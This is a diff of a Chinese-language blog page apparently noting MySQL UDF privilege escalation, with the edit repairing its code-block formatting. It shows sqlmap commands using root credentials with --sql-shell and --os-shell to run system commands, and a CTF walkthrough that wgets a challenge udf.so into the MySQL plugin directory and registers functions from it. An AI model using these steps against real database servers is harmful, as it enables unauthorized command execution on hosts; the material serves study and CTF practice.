@@ -116,7 +116,7 @@
 <meta property="og:site_name" content="cws6">
 <meta property="og:description" content="UDF提权是利用MySQL的自定义函数功能，将MySQL账号转化为系统system权限 下载lib_mysqludf_sys程序github：https://github.com/mysqludf/lib_mysqludf_sys  编译获取lib_mysqludf_sys.so文件 1$ gcc -DMYSQL_DYNAMIC_PLUGIN -fPIC -Wall -I/usr/include/">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-02T13:06:43.391Z">
+<meta property="og:updated_time" content="2018-12-02T13:12:28.385Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql提权">
 <meta name="twitter:description" content="UDF提权是利用MySQL的自定义函数功能，将MySQL账号转化为系统system权限 下载lib_mysqludf_sys程序github：https://github.com/mysqludf/lib_mysqludf_sys  编译获取lib_mysqludf_sys.so文件 1$ gcc -DMYSQL_DYNAMIC_PLUGIN -fPIC -Wall -I/usr/include/">
@@ -382,7 +382,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-02 21:06:43" itemprop="dateModified" datetime="2018-12-02T21:06:43+08:00">2018-12-02</time>
+                <time title="Modified: 2018-12-02 21:12:28" itemprop="dateModified" datetime="2018-12-02T21:12:28+08:00">2018-12-02</time>
               
             
           </span>
@@ -445,16 +445,43 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.user where user=substring_index(user(),&apos;@&apos;,1);</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><code>@@version_compile_os</code>展示MySQL结构，<code>@@version_compile_machine</code>展示操作系统的结构：<br><figure class="highlight plain"><figcaption><span>@@version_compile_os, @@version_compile_machine;```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 尝试使用sqlmap提权。</span><br><span class="line"></span><br><span class="line">(1)sqlmap通过root的账号和密码连接上远程的数据库</span><br><span class="line">(2)sqlmap将udf文件夹下对应系统平台的64位或者32位的动态链接库文件上传到远程数据库的mysql/plugin/目录下</span><br><span class="line">(3)sqlmap用过已经上传的动态链接库文件来调用system函数来执行用户输入的命令</span><br><span class="line"></span><br><span class="line">*PS:想要在win下链接外部数据库，需要先切换到bin目录下再链接*</span><br></pre></td></tr></table></figure></p>
-<p>G:\wamp\wamp\bin\mysql\mysql5.6.17\bin&gt;mysql -h 192.168.8.129 -u root -p<br>G:\python2\sqlmap&gt;python sqlmap.py -d mysql://root:@127.0.0.1:3306/test –sql-shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 通过这个函数可以查看路径，然后将上面提到的文件传入到里面，但是将文件写进去的命令我用不成，不知道为什么</span><br></pre></td></tr></table></figure></p>
-<p>sql-shell&gt; select @@plugin_dir;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 感觉os-shell这个很强，可以直接用，不用上传文件</span><br></pre></td></tr></table></figure></p>
-<p>G:\python2\sqlmap&gt;python sqlmap.py -d mysql://root:@127.0.0.1:3306/test –os-shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 然后选择是多少位的</span><br></pre></td></tr></table></figure></p>
-<p>os-shell&gt; whoami<br>os-shell&gt; ipconfig<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*PS:这两个命令都有回显，而且也是正确的，除了汉字没出来。。*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 一道相关ctf</span><br><span class="line">在一道ctf题中，遇到的和这个有关的：https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span><br><span class="line"></span><br><span class="line">**解题思路**</span><br><span class="line">* udf.so导入mysql。</span><br><span class="line"></span><br><span class="line">* `cp udf.so.02f8981200697e5eeb661e64797fc172 /usr/lib/mysql/plugin`</span><br><span class="line"></span><br><span class="line">* 然后进到/usr/lib/mysql/plugin目录wget一下</span><br></pre></td></tr></table></figure></p>
-<p>cd /usr/lib/mysql/plugin<br>sudo wget <a href="https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 然后进入mysql之中，根据提示可以利用help_me函数，利用如下语句。</span><br></pre></td></tr></table></figure></p>
-<p>mysql&gt; create function help_me returns string soname ‘udf.so.02f8981200697e5eeb661e64797fc172’;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 然后我们查看一下</span><br></pre></td></tr></table></figure></p>
-<p>select help_me();<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 说答案在getflag中，同样我们构造getflag函数</span><br></pre></td></tr></table></figure></p>
-<p>mysql&gt; create function getflag returns string soname ‘udf.so.02f8981200697e5eeb661e64797fc172’;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 然后查看</span><br></pre></td></tr></table></figure></p>
-<p>mysql&gt;select getflag();<br><code>`</code></p>
+<p><code>@@version_compile_os</code>展示MySQL结构，<code>@@version_compile_machine</code>展示操作系统的结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version_compile_os, @@version_compile_machine;</span><br></pre></td></tr></table></figure></p>
+<h4 id="尝试使用sqlmap提权。"><a href="#尝试使用sqlmap提权。" class="headerlink" title="尝试使用sqlmap提权。"></a>尝试使用sqlmap提权。</h4><p>(1)sqlmap通过root的账号和密码连接上远程的数据库<br>(2)sqlmap将udf文件夹下对应系统平台的64位或者32位的动态链接库文件上传到远程数据库的mysql/plugin/目录下<br>(3)sqlmap用过已经上传的动态链接库文件来调用system函数来执行用户输入的命令</p>
+<p><em>PS:想要在win下链接外部数据库，需要先切换到bin目录下再链接</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">G:\wamp\wamp\bin\mysql\mysql5.6.17\bin&gt;mysql -h 192.168.8.129 -u root -p</span><br><span class="line">G:\python2\sqlmap&gt;python sqlmap.py -d mysql://root:@127.0.0.1:3306/test --sql-shell</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>通过这个函数可以查看路径，然后将上面提到的文件传入到里面，但是将文件写进去的命令我用不成，不知道为什么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql-shell&gt; select @@plugin_dir;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>感觉os-shell这个很强，可以直接用，不用上传文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G:\python2\sqlmap&gt;python sqlmap.py -d mysql://root:@127.0.0.1:3306/test --os-shell</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后选择是多少位的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; whoami</span><br><span class="line">os-shell&gt; ipconfig</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><em>PS:这两个命令都有回显，而且也是正确的，除了汉字没出来。。</em></p>
+<h4 id="一道相关ctf"><a href="#一道相关ctf" class="headerlink" title="一道相关ctf"></a>一道相关ctf</h4><p>在一道ctf题中，遇到的和这个有关的：<a href="https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</a></p>
+<p><strong>解题思路</strong></p>
+<ul>
+<li><p>udf.so导入mysql。</p>
+</li>
+<li><p><code>cp udf.so.02f8981200697e5eeb661e64797fc172 /usr/lib/mysql/plugin</code></p>
+</li>
+<li><p>然后进到/usr/lib/mysql/plugin目录wget一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/lib/mysql/plugin</span><br><span class="line">sudo wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后进入mysql之中，根据提示可以利用help_me函数，利用如下语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function help_me returns string soname &apos;udf.so.02f8981200697e5eeb661e64797fc172&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后我们查看一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select help_me();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>说答案在getflag中，同样我们构造getflag函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function getflag returns string soname &apos;udf.so.02f8981200697e5eeb661e64797fc172&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后查看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;select getflag();</span><br></pre></td></tr></table></figure></li>
+</ul>
 
       
     </div>
@@ -636,7 +663,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#下载lib-mysqludf-sys程序"><span class="nav-number">1.</span> <span class="nav-text">下载lib_mysqludf_sys程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用思路"><span class="nav-number">2.</span> <span class="nav-text">利用思路</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#下载lib-mysqludf-sys程序"><span class="nav-number">1.</span> <span class="nav-text">下载lib_mysqludf_sys程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用思路"><span class="nav-number">2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#尝试使用sqlmap提权。"><span class="nav-number">3.</span> <span class="nav-text">尝试使用sqlmap提权。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一道相关ctf"><span class="nav-number">4.</span> <span class="nav-text">一道相关ctf</span></a></li></ol></div>
             
 
           </div>
